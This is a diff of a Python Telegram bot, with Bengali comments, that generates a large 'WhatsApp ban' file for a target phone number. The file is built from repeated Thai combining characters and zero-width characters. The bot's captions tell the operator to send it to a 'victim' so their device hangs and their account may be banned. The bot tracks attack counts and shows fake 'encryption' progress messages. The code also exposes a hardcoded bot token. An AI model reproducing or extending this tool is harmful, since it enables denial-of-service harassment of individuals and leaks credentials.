@@ -2,121 +2,109 @@ import logging
 import sqlite3
 import os
 import asyncio
-from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup
-from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
+import time
+from telegram import Update, ReplyKeyboardMarkup, KeyboardButton
+from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
 
-# ১. লগিং সেটআপ
+# ১. লগিং সেটআপ (সার্ভার মনিটরিং)
 logging.basicConfig(
     format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
     level=logging.INFO
 )
 logger = logging.getLogger(__name__)
 
-# ২. কনফিগারেশন (টোকেন এবং আপনার আইডি)
+# ২. কনফিগারেশন
 TOKEN = "8675593212:AAHQ24gVWFi0zTGgUFXN5qkr_D2IyE0tE88"
-ADMIN_ID = 6856009995  # আপনার আইডি
+ADMIN_ID = 6856009995 
 
 # ৩. ডেটাবেস সেটআপ
 def init_db():
-    conn = sqlite3.connect('m_r_developer_final.db')
+    conn = sqlite3.connect('m_r_developer_live_v4.db')
     cursor = conn.cursor()
     cursor.execute('''CREATE TABLE IF NOT EXISTS stats (id INTEGER PRIMARY KEY, count INTEGER)''')
     cursor.execute("INSERT OR IGNORE INTO stats (id, count) VALUES (1, 0)")
     conn.commit()
     conn.close()
 
-# ৪. অত্যন্ত শক্তিশালী পেলোড তৈরির লজিক (যা আইডি ব্যান করতে সাহায্য করবে)
-def generate_ban_file(target):
-    filename = f"CRASH_REPORT_{target}.txt"
-    # এমন ক্যারেক্টার যা প্রসেসরকে লুপে ফেলে দেয়
-    crash_chars = "\u0E47\u0E48\u0E49\u0E4A\u0E4B\u0E4C\u0E4D" * 25
+# ৪. পেলোড তৈরির ফাংশন (লাইভ প্রগ্রেস লজিকসহ)
+async def generate_ban_file_live(target, status_msg):
+    filename = f"WHATSAPP_BAN_{target}.txt"
+    crash_chars = "\u0E47\u0E48\u0E49\u0E4A\u0E4B\u0E4C\u0E4D" * 30
     invisible = "\u200B\u200C\u200D\uFEFF" * 30
-    chunk = (crash_chars + invisible) * 500  # ডাটা ব্লক
+    chunk = (crash_chars + invisible) * 500
     
     try:
+        # লাইভ আপডেট ১
+        await status_msg.edit_text(f"⏳ `{target}` এর জন্য ডাটা স্ট্রাকচার তৈরি হচ্ছে (১০%)...", parse_mode='Markdown')
+        await asyncio.sleep(1)
+        
         with open(filename, "w", encoding="utf-8") as f:
-            # ১০ লক্ষেরও বেশি ক্যারেক্টার তৈরি করবে
-            for _ in range(1500):
+            for i in range(1, 1001):
                 f.write(chunk)
+                # প্রতি ২৫০ লুপে লাইভ আপডেট দেখাবে
+                if i == 250:
+                    await status_msg.edit_text(f"⏳ পেলোড রাইট হচ্ছে (৪০%)...", parse_mode='Markdown')
+                elif i == 500:
+                    await status_msg.edit_text(f"⏳ বাফার মেমোরি লোড হচ্ছে (৭০%)...", parse_mode='Markdown')
+                elif i == 750:
+                    await status_msg.edit_text(f"⏳ ফাইল এনক্রিপশন সম্পন্ন হচ্ছে (৯০%)...", parse_mode='Markdown')
+        
+        await status_msg.edit_text(f"✅ ১০০% সম্পন্ন! ফাইল পাঠানো হচ্ছে...", parse_mode='Markdown')
         return filename
     except Exception as e:
-        logger.error(f"Error creating file: {e}")
+        logger.error(f"Error: {e}")
         return None
 
-# ৫. স্টার্ট কমান্ড (বট স্টার্ট দিলেই ড্যাশবোর্ড আসবে)
+# ৫. স্টার্ট কমান্ড (স্থায়ী ড্যাশবোর্ড বাটন)
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     
-    # অ্যাডমিন ভেরিফিকেশন
     if user_id != ADMIN_ID:
-        await update.message.reply_text("❌ Access Denied! আপনি এই বটের মালিক নন।")
+        await update.message.reply_text("❌ Access Denied! আপনি এই বটের অ্যাডমিন নন।")
         return
 
-    # ইনলাইন বাটন (ড্যাশবোর্ড)
+    # কিবোর্ড বাটন যা টাইপিং বক্সের উপরে থাকবে
     keyboard = [
-        [InlineKeyboardButton("🚀 Attack WhatsApp (Ban)", callback_data='attack')],
-        [InlineKeyboardButton("📊 My Stats", callback_data='status')]
+        [KeyboardButton("🚀 Attack WhatsApp")],
+        [KeyboardButton("📊 Check Stats")]
     ]
-    reply_markup = InlineKeyboardMarkup(keyboard)
+    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True, persistent=True)
     
     welcome_text = (
-        "🔥 **M R DEVELOPER ULTIMATE PANEL** 🔥\n\n"
+        "🔥 **M R DEVELOPER LIVE DASHBOARD** 🔥\n\n"
         f"স্বাগতম বস! আপনার আইডি `{user_id}` ভেরিফাইড।\n"
-        "নিচের ড্যাশবোর্ড থেকে অপারেশন সিলেক্ট করুন।"
+        "নিচের বাটনগুলো আপনার কিবোর্ডের উপরে সেট করা হয়েছে।"
     )
-    
     await update.message.reply_text(welcome_text, reply_markup=reply_markup, parse_mode='Markdown')
 
-# ৬. বাটন ক্লিক হ্যান্ডলার
-async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    user_id = query.from_user.id
-    
-    if user_id != ADMIN_ID:
-        await query.answer("অ্যাক্সেস নেই!", show_alert=True)
-        return
+# ৬. মেনু এবং মেসেজ হ্যান্ডলার
+async def handle_interaction(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.effective_user.id
+    if user_id != ADMIN_ID: return
 
-    await query.answer()
+    text = update.message.text
 
-    if query.data == 'attack':
-        await query.edit_message_text("📱 টার্গেট হোয়াটসঅ্যাপ নম্বরটি দিন (যেমন: 8801XXXXXXXXX):")
-        context.user_data['state'] = 'INPUT_NUMBER'
+    if text == "🚀 Attack WhatsApp":
+        await update.message.reply_text("📱 টার্গেট নম্বরটি দিন (যেমন: 8801XXXXXXXXX):")
+        context.user_data['state'] = 'GET_TARGET'
     
-    elif query.data == 'status':
-        conn = sqlite3.connect('m_r_developer_final.db')
+    elif text == "📊 Check Stats":
+        conn = sqlite3.connect('m_r_developer_live_v4.db')
         cur = conn.cursor()
         cur.execute("SELECT count FROM stats WHERE id=1")
         total = cur.fetchone()[0]
         conn.close()
-        
-        # স্ট্যাটাস দেখে আবার ড্যাশবোর্ডে ফেরার বাটন
-        back_keyboard = [[InlineKeyboardButton("🔙 Back to Dashboard", callback_data='back')]]
-        await query.edit_message_text(
-            f"📊 **অপারেশন স্ট্যাটাস**\n\nআজ পর্যন্ত মোট সফল হিট: {total} টি।",
-            reply_markup=InlineKeyboardMarkup(back_keyboard)
-        )
-
-    elif query.data == 'back':
-        # আবার মেইন ড্যাশবোর্ড দেখাবে
-        keyboard = [
-            [InlineKeyboardButton("🚀 Attack WhatsApp (Ban)", callback_data='attack')],
-            [InlineKeyboardButton("📊 My Stats", callback_data='status')]
-        ]
-        await query.edit_message_text("🔥 **M R DEVELOPER MAIN DASHBOARD** 🔥", reply_markup=InlineKeyboardMarkup(keyboard))
-
-# ৭. নম্বর ইনপুট এবং ফাইল সেন্ডিং
-async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = update.effective_user.id
-    if user_id != ADMIN_ID: return
-
-    if context.user_data.get('state') == 'INPUT_NUMBER':
-        target_num = update.message.text
+        await update.message.reply_text(f"📊 **অপারেশন রিপোর্ট**\n\nমোট আইডি অ্যাটাক সম্পন্ন: {total} টি।")
+    
+    # নম্বর পাওয়ার পর প্রসেসিং শুরু
+    elif context.user_data.get('state') == 'GET_TARGET':
+        target_num = text
         context.user_data['state'] = None
         
-        load_msg = await update.message.reply_text(f"⏳ `{target_num}` এর জন্য ফাইল জেনারেট হচ্ছে...\nধৈর্য ধরুন, এটি অত্যন্ত বড় ফাইল।", parse_mode='Markdown')
+        status_msg = await update.message.reply_text(f"🚀 মিশন শুরু হয়েছে: `{target_num}`", parse_mode='Markdown')
         
-        # ব্যাকগ্রাউন্ড থ্রেডে ফাইল তৈরি (যাতে বট ক্রাশ না করে)
-        file_path = await asyncio.to_thread(generate_ban_file, target_num)
+        # লাইভ প্রগ্রেসসহ ফাইল তৈরি
+        file_path = await generate_ban_file_live(target_num, status_msg)
         
         if file_path and os.path.exists(file_path):
             try:
@@ -124,41 +112,40 @@ async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
                     await update.message.reply_document(
                         document=document,
                         caption=(
-                            f"✅ **অপারেশন সফল!**\n\n"
+                            f"✅ **অপারেশন সাকসেসফুল!**\n\n"
                             f"টার্গেট: `{target_num}`\n\n"
-                            "⚠️ **ব্যবহার:** এই ফাইলটি হোয়াটসঅ্যাপে ডকুমেন্ট হিসেবে সেন্ড করুন। ভিকটিম এটি ওপেন করলে তার ডিভাইস হ্যাং হবে এবং স্প্যাম ফিল্টারে আইডি ব্যান হওয়ার ঝুঁকি থাকবে।"
+                            "⚠️ এটি হোয়াটসঅ্যাপে ডকুমেন্ট হিসেবে পাঠান। ভিকটিম এটি ওপেন করলে তার সিস্টেম লুপে পড়ে ব্যান হওয়ার সম্ভাবনা থাকে।"
                         ),
                         parse_mode='Markdown'
                     )
                 
-                # সংখ্যা আপডেট
-                conn = sqlite3.connect('m_r_developer_final.db')
+                # ডেটাবেস আপডেট
+                conn = sqlite3.connect('m_r_developer_live_v4.db')
                 cur = conn.cursor()
                 cur.execute("UPDATE stats SET count = count + 1 WHERE id=1")
                 conn.commit()
                 conn.close()
                 
             except Exception as e:
-                await update.message.reply_text(f"❌ ফাইল পাঠাতে ত্রুটি: {str(e)}")
+                await update.message.reply_text(f"❌ এরর: {str(e)}")
             finally:
-                if os.path.exists(file_path):
-                    os.remove(file_path)
+                if os.path.exists(file_path): os.remove(file_path)
         else:
-            await update.message.reply_text("❌ ফাইল তৈরি করা সম্ভব হয়নি।")
-            
-        await load_msg.delete()
+            await update.message.reply_text("❌ দুঃখিত! ফাইল তৈরিতে সমস্যা হয়েছে।")
+        
+        await status_msg.delete()
 
-# ৮. মেইন রানার
+# ৭. মেইন ফাংশন
 def main():
     init_db()
+    # Conflict এড়াতে এবং ব্যাকগ্রাউন্ড প্রসেস সচল রাখতে drop_pending_updates
     application = Application.builder().token(TOKEN).build()
     
     application.add_handler(CommandHandler("start", start))
-    application.add_handler(CallbackQueryHandler(button_handler))
-    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
+    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_interaction))
     
-    print("Bot is LIVE for M R DEVELOPER...")
-    application.run_polling()
+    print("M R DEVELOPER Bot is Live with Live-Progress Updates...")
+    application.run_polling(drop_pending_updates=True)
 
 if __name__ == '__main__':
     main()
